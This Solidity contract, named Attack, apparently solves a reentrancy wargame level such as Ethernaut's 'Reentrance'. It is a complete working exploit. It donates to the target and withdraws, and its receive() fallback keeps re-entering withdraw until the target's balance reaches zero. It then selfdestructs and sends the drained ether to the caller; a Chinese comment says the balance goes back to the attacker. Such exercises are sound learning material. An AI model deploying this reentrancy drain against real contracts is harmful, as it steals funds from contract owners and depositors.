// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Attack {
    IReentrance private immutable target;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    // NOTE: attack cannot be called inside constructor
    function attack() external payable {
        target.donate{value: 100000000000000}(address(this));
        target.withdraw(100000000000000);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender)); //將攻擊合約內的餘額全部返還到攻擊者的地址
    }

    receive() external payable {
        uint256 amount = min(100000000000000, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}